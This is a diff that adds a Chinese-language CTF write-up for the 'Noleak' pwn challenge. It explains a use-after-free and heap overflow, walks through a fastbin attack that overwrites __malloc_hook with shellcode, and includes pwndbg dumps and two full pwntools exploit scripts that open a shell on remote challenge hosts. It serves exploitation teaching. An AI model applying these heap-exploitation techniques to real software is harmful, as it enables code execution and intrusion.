@@ -1265,3 +1265,462 @@ sh.interactive()
 题目：暂无
 
 思路：程序逻辑是对输入的数据计算sha256，然后比较这个值是否等于某个特定的值，如果等于则可以执行一个特定的命令。漏洞点在于未检查输入数据长度，导致可以覆盖到目标散列值和命令字符串，这样只要根据一个已知字符串及其散列值，就可以任意构造命令获取flag。
+
+### 18. Noleak
+题目：暂无
+
+思路：漏洞点主要有两个，一是free后指针未置空，存在UAF，二是修改数据时没有检查数据长度存在堆溢出。由于开启了Full RELRO保护、未开启NX，因此不能修改got表，而是使用的是修改__malloc_hook地址，将其指向shellcode，当再次执行malloc时获得flag。
+
+chunk数据结构
+```c++
+// chunk数据结构
+struct malloc_chunk {
+    int mchunk_prev_size;    // 前一个堆为空闲时记录前一个堆的大小，不空闲时为前一个堆的数据部分
+                             // 这个字段实际属于前一个堆结构数据部分！
+    int mchunk_size;         // 堆块的大小（包括数据和堆头，不包含前一个字段）
+                             // 这个字段的后三个bit用于标志位，计算大小时忽略
+                             // 最后一个bit记录前一个块是否被分配
+    struct malloc_chunk* fd; // 前一个空闲堆块，free状态有用
+    struct malloc_chunk* bk; // 后一个空闲堆块，free状态有用
+}
+```
+#### 修改glibc版本调试堆
+```python
+# 先下载对应版本libc
+cd glibc-all-in-one
+/download 2.23-0ubuntu11.2_amd64
+# 然后修改二进制程序的libc库
+ldd timu
+        linux-vdso.so.1 (0x00007ffcb71d7000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa64a3eb000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fa64a5c9000)
+patchelf --set-interpreter ./libs/2.23-0ubuntu11.2_amd64/ld-2.23.so  timu
+patchelf --set-rpath ./libs/2.23-0ubuntu11.2_amd64/ timu
+ldd timu
+        linux-vdso.so.1 (0x00007ffd5b7db000)
+        libc.so.6 => ./libs/2.23-0ubuntu11.2_amd64/libc.so.6 (0x00007f3930b33000)
+        ./libs/2.23-0ubuntu11.2_amd64/ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007f3930eff000)
+```
+
+#### fastbin攻击
+当释放堆的大小（包含头部）在fastbin大小范围内（64位fastbin的大小为0x20-0x80)时，会进入fastbin链表，通过fd形成单链表，增加和移除节点都在链头进行操作。当存在uaf漏洞时，可以修改fd字段从而改变链表。
+```python
+# fastbin攻击的目的是通过uaf伪造一个fastbin链表项，然后malloc得到改链表项，实现任意地址写入
+# 这里存在两个问题：
+# 一是确定需要写入的地址，由于本题无法修改got，只能修改__malloc_hook函数指针
+# 但是由于无法直接确定该指针的地址，在unsortedbin chunk中包含这个地址相邻的地址
+# 进一步可以通过fastbin攻击将unsortedbin chunk链如fastbin链表中获取到这个地址
+# 获取到的unsortedbin地址在buf中，并且这个地址和__malloc_hook最后一个字节不同
+# 需要能够写入buf修改这个字节，因此确定需要写入的地址为buf，或者buf之前的地址
+# 二是伪造的fastbin链表项的大小应该满足fastbin的大小，在内存中查找buf之前的地址x
+# 使得x指向的8个字节整数小于等于0x7f
+# buf的地址为601040，data段起始地址为601000，实际上可以在data再往前16个字节开始搜索（再往前就是got表了，但是got表是不可写的）
+pwndbg> x/40b 0x600ff0
+0x600ff0:       0x90    0xce    0x7e    0x14    0x96    0x7f    0x00    0x00
+0x600ff8:       0x40    0x00    0x7f    0x14    0x96    0x7f    0x00    0x00
+0x601000:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x601008:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x601010:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+# 可以看到600ffd处的数值为0x000000000000007f，满足fastbin大小
+# 因此伪造的链表地址为0x600ff5,堆大小为0x70，数据大小为0x68
+add(0x68,'0')
+add(0x68,'1')
+add(0x68,'2')
+dele(1)
+dele(0)
+# 释放两个节点后，fastbins中多出了一个单链表
+pwndbg> heap
+Free chunk (fastbins) | PREV_INUSE
+Addr: 0x113a000
+Size: 0x71
+fd: 0x113a070
+
+Free chunk (fastbins) | PREV_INUSE
+Addr: 0x113a070
+Size: 0x71
+fd: 0x00
+
+Allocated chunk | PREV_INUSE
+Addr: 0x113a0e0
+Size: 0x71
+
+Top chunk | PREV_INUSE
+Addr: 0x113a150
+Size: 0x20eb1
+
+pwndbg> fastbins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x113a000 —▸ 0x113a070 ◂— 0x0
+0x80: 0x0
+
+# 由于存在uaf，可以继续编辑第一个chunk，从而修改fd字段，进而破坏单链表
+edit(0,8,p64(0x600ff5))
+# 修改后的堆如下
+pwndbg> heap
+Free chunk (fastbins) | PREV_INUSE
+Addr: 0x113a000
+Size: 0x71
+fd: 0x600ff5
+
+Allocated chunk | PREV_INUSE
+Addr: 0x113a070
+Size: 0x71
+
+Allocated chunk | PREV_INUSE
+Addr: 0x113a0e0
+Size: 0x71
+
+Top chunk | PREV_INUSE
+Addr: 0x113a150
+Size: 0x20eb1
+
+pwndbg> fastbins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x113a000 —▸ 0x600ff5 ◂— 0
+
+# 再连续创建两个节点就会从伪造的单链表中取出chunk，节点3正常，而节点4则指向伪造的0x600ff5+0x10处
+# 节点4在buf前面某个地方，这样通过在节点4中写入数据实际上就可以控制buf的内容了
+add(0x68,'3')
+add(0x68,'4')
+# 堆结构和buf缓存如下
+pwndbg> x/20x 0x601040
+0x601040:       0x0113a010      0x00000000      0x0113a080      0x00000000
+0x601050:       0x0113a0f0      0x00000000      0x0113a010      0x00000000
+0x601060:       0x00601005      0x00000000      0x00000000      0x00000000
+0x601070:       0x00000000      0x00000000      0x00000000      0x00000000
+0x601080:       0x00000000      0x00000000      0x00000000      0x00000000
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x113a000
+Size: 0x71
+
+Allocated chunk | PREV_INUSE
+Addr: 0x113a070
+Size: 0x71
+
+Allocated chunk | PREV_INUSE
+Addr: 0x113a0e0
+Size: 0x71
+
+Top chunk | PREV_INUSE
+Addr: 0x113a150
+Size: 0x20eb1
+
+# 下面利用节点4将buf中节点4之前的指针全部清空
+payload='\00'*0x5b
+edit(4,len(payload),payload)
+# 执行完之后buf的内容如下
+pwndbg> x/20x 0x601040
+0x601040:       0x00000000      0x00000000      0x00000000      0x00000000
+0x601050:       0x00000000      0x00000000      0x00000000      0x00000000
+0x601060:       0x00601005      0x00000000      0x00000000      0x00000000
+0x601070:       0x00000000      0x00000000      0x00000000      0x00000000
+0x601080:       0x00000000      0x00000000      0x00000000      0x00000000
+
+# 由于buf前4项为空，因此可以继续创建节点，再创建4个节点
+# 其中节点2的大小超出了fastbin
+add(0x68,'0')
+add(0x68,'1')
+add(0x80,'2')
+add(0x68,'3')
+
+# 再依次删除3，0，2节点，其中3，0进入fastbin形成单链表，2进入unsortedbin形成双链表
+# 并且unsortedbin chunk默认指向main_arena+88处
+dele(3)
+dele(0)
+dele(2)
+# 此时堆分布如下
+Free chunk (fastbins) | PREV_INUSE
+Addr: 0x113a150
+Size: 0x71
+fd: 0x113a2c0
+
+Allocated chunk | PREV_INUSE
+Addr: 0x113a1c0
+Size: 0x71
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x113a230
+Size: 0x91
+fd: 0x7fcb68da7b78
+bk: 0x7fcb68da7b78
+
+Free chunk (fastbins)
+Addr: 0x113a2c0
+Size: 0x70
+fd: 0x00
+
+Top chunk | PREV_INUSE
+Addr: 0x113a330
+Size: 0x20cd1
+
+pwndbg> fastbins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x113a150 —▸ 0x113a2c0 ◂— 0x0
+0x80: 0x0
+pwndbg> unsortedbin 
+unsortedbin
+all: 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
+
+# 再次通过uaf漏洞修改fastbins单链表，将0x113a150的fd指针的第一个字节（低字节）修改为30
+edit(0,1,'\x30')
+# 这时单链表的第一个节点的fd指针实际指向节点2的堆块
+# 再创建3个对应大小的节点就可以从得到main_arena+88附近的指针了
+# 这里我们需要修改的是__malloc_hook，对应地址为0x7fcb68da7b10
+pwndbg> fastbins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x113a150 —▸ 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
+0x80: 0x0
+pwndbg> unsortedbin 
+unsortedbin
+all: 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
+# 由于libc在加载到内存时最后一个字节始终是固定的，因此我们只要能够将__malloc_hook的前七个字节写入到buf
+# 然后通过节点4操作buf的能力将第0x10（__malloc_hook第8字节）写入到buf中就可以得到__malloc_hook的准确地址了
+# 这里存在一个问题，能够直接创建3个对应大小的节点么？
+# 实际上是不行的，由于fastbin还有一个检查机制，如果链表中的堆块大小异常会报错
+# 即伪造的fastbin chunk，也就是0x7fcb68da7b78+8(对应chunk的size字段)是否为0x70-0x7f之间（如果是其他fastbin大小以此类推），检查main_arena+88明显不满足
+# 通过查看0x7fcb68da7b00之后的内存可以找到一个满足的地址，0x7fcb68da7b05
+# 0x7fcb68da7b05+8 => 0x7f    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+pwndbg> x/40b 0x7fcb68da7b00
+0x7fcb68da7b00 <__memalign_hook>:       0xa0    0x8e    0xa6    0x68    0xcb    0x7f    0x00    0x00
+0x7fcb68da7b08 <__realloc_hook>:        0x70    0x8a    0xa6    0x68    0xcb    0x7f    0x00    0x00
+0x7fcb68da7b10 <__malloc_hook>:         0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7fcb68da7b18:                         0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7fcb68da7b20 <main_arena>:            0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+
+# 利用uaf漏洞编辑节点2，可以修改节点2的fd字段的第一个字节
+edit(2,1,'\x05')
+# 此时堆内存如下，这时候伪造的chunk 0x7fcb68da7b05的大小就能够绕过fastbin检查机制了
+pwndbg> x/10x 0x7fcb68da7b0d
+0x7fcb68da7b0d <__realloc_hook+5>:      0x0000007f      0x00000000      0x00000000      0x00000000
+0x7fcb68da7b1d: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fcb68da7b2d <main_arena+13>: 0x00000000      0x00000000
+pwndbg> fastbins
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x113a150 —▸ 0x113a230 —▸ 0x7fcb68da7b05 (__memalign_hook+5) ◂— 0
+0x80: 0x0
+pwndbg> unsortedbin 
+unsortedbin
+all [corrupted]
+FD: 0x113a230 —▸ 0x7fcb68da7b05 (__memalign_hook+5) ◂— 0
+BK: 0x113a230 —▸ 0x7fcb68da7b78 (main_arena+88) ◂— xor    byte ptr [rdx + 0x113], ah /* 0x113a230 */
+# 为了绕过fastbin的检查机制，还需要修改伪造的fastbin chunk 0x113a230的size字段为0x71(最后一位为标志位)
+# 为了修改chunk 0x113a230（改chunk的上一个chunk为节点1对应的chunk）
+# 需要利用节点1的堆溢出漏洞，覆盖该chunk头部的size字段
+payload='\x00'*0x68+'\x71'
+edit(1,len(payload),payload)
+
+# 再连续创建三个节点即可将0x7fcb68da7b05+0x10写入buf[7]
+add(0x68,'5')
+add(0x68,'6')
+add(0x68,'7')
+
+# 此时buf[4]中保存的还是0x00601005，通过修改节点4可以写入shellcode，同时修改buf[7]的第一个字节为0x10
+# buf[7]第一个字节的地址为0x00601078，因此共需要写入0x73字节
+shellcode=asm(shellcraft.sh()).ljust(0x73,'\x00')+'\x10'
+edit(4,len(shellcode),shellcode)
+
+# 最后将shellcode的首地址写入__malloc_hook所指向的内存中，再调用一次malloc即可执行shellcode
+edit(7,8,p64(0x601005))
+io.sendline('1')
+io.sendline('1')
+io.interactive()
+```
+
+xctf-wp全部源代码如下：
+```python
+from pwn import *
+
+debug=0
+
+context.log_level='debug'
+context.arch='amd64'
+shellcode=asm(shellcraft.sh()).ljust(0x73,'\x00')+'\x10'
+if debug:
+    io=process('./timu')
+else:
+    io=remote('111.198.29.45',46917)
+
+def add(size,data):
+    io.recvuntil("Your choice :")
+    io.sendline("1")
+    io.recvuntil("Size: ")
+    io.sendline(str(size))
+    io.recvuntil("Data: ")
+    io.sendline(data)
+def dele(index):
+    io.recvuntil("Your choice :")
+    io.sendline("2")
+    io.recvuntil("Index: ")
+    io.sendline(str(index))
+def edit(index,size,data):
+    io.recvuntil("Your choice :")
+    io.sendline("3")
+    io.recvuntil("Index: ")
+    io.sendline(str(index))
+    io.recvuntil("Size: ")
+    io.sendline(str(size))
+    io.recvuntil("Data: ")
+    io.sendline(data)
+if __name__== "__main__":
+    add(0x68,'0')
+    add(0x68,'1')
+    add(0x68,'2')
+    dele(1)
+    dele(0)
+    edit(0,8,p64(0x600ff5))
+    add(0x68,'3')
+    add(0x68,'4')
+    #gdb.attach(io)
+    #pause()
+    payload='\00'*0x5b
+    edit(4,len(payload),payload)
+    #gdb.attach(io)
+    #pause()
+
+    add(0x68,'0')
+    add(0x68,'1')
+    add(0x80,'2')
+    add(0x68,'3')
+    #gdb.attach(io)
+    #pause()    
+    dele(3)
+    dele(0)
+    dele(2)
+    edit(0,1,'\x30')
+    edit(2,1,'\x05')
+    payload='\x00'*0x68+'\x71'
+    edit(1,len(payload),payload)
+    #gdb.attach(io)
+    #pause()    
+    add(0x68,'5')
+    add(0x68,'6')
+    add(0x68,'7')
+    edit(4,len(shellcode),shellcode)
+    edit(7,8,p64(0x601005))
+    #gdb.attach(io)
+    #pause()    
+    #edit(2,)
+    io.sendline('1')
+    io.sendline('1')
+    io.interactive()
+```
+
+优化后的源代码如下：
+```python
+from pwn import *
+
+debug=0
+
+context.log_level='debug'
+context.arch='amd64'
+if debug:
+    io=process('./timu')
+else:
+    io=remote('220.249.52.134', 31850)
+
+def add(size,data):
+    io.recvuntil("Your choice :")
+    io.sendline("1")
+    io.recvuntil("Size: ")
+    io.sendline(str(size))
+    io.recvuntil("Data: ")
+    io.sendline(data)
+def dele(index):
+    io.recvuntil("Your choice :")
+    io.sendline("2")
+    io.recvuntil("Index: ")
+    io.sendline(str(index))
+def edit(index,size,data):
+    io.recvuntil("Your choice :")
+    io.sendline("3")
+    io.recvuntil("Index: ")
+    io.sendline(str(index))
+    io.recvuntil("Size: ")
+    io.sendline(str(size))
+    io.recvuntil("Data: ")
+    io.sendline(data)
+if __name__== "__main__":
+    add(0x68,'0')
+    dele(0)
+    edit(0,8,p64(0x600ff5))
+    # same with node 0
+    add(0x68,'1')
+    add(0x68,'2')
+    # delete chunk 0(1)
+    dele(0)
+    # buf[8] = 0x601000
+    payload='\00'*0x7b + p64(0x601000)
+    edit(2,len(payload),payload)
+    # gdb.attach(io)
+    # pause()
+
+    add(0x68,'0')
+    add(0x68,'1')
+    add(0x80,'2')
+    # prevent merge
+    add(0x68,'3')
+    # gdb.attach(io)
+    # pause()
+    # fastbin link chunk0 -> chunk1
+    dele(1)
+    dele(0)
+    # unsortedbin chunk2
+    dele(2)
+    # gdb.attach(io)
+    # pause()
+    # make fastbin link chunk0 -> chunk2 -> chunk(main_arena+88)
+    edit(0,1,'\xe0')
+    # gdb.attach(io)
+    # pause()
+    # make fastbin link chunk0 -> chunk2 -> chunk(__memalign_hook+5)
+    # ensure fake chunk size 0x7f
+    edit(2,1,'\x05')
+    # gdb.attach(io)
+    # pause()    
+    # overflow chunk1 to set chunk2 size 0x71
+    payload='\x00'*0x68+'\x71'
+    edit(1,len(payload),payload)
+    # gdb.attach(io)
+    # pause()
+    add(0x68,'4')
+    add(0x68,'5')
+    # buf[6] ==  __memalign_hook+5+0x10(chunk head)
+    add(0x68,'6')
+    # write shellcode to buf[8] 0x601000
+    # the last 0x10 make buf[6] = __malloc_hook
+    shellcode=asm(shellcraft.sh()).ljust(0x70,'\x00')+'\x10'
+    edit(8,len(shellcode),shellcode)
+    # set *buf[6] = *__malloc_hook = &shellcode
+    edit(6,8,p64(0x601000))
+    # gdb.attach(io)
+    # pause()
+    io.sendline('1')
+    io.sendline('1')
+    io.interactive()
+```
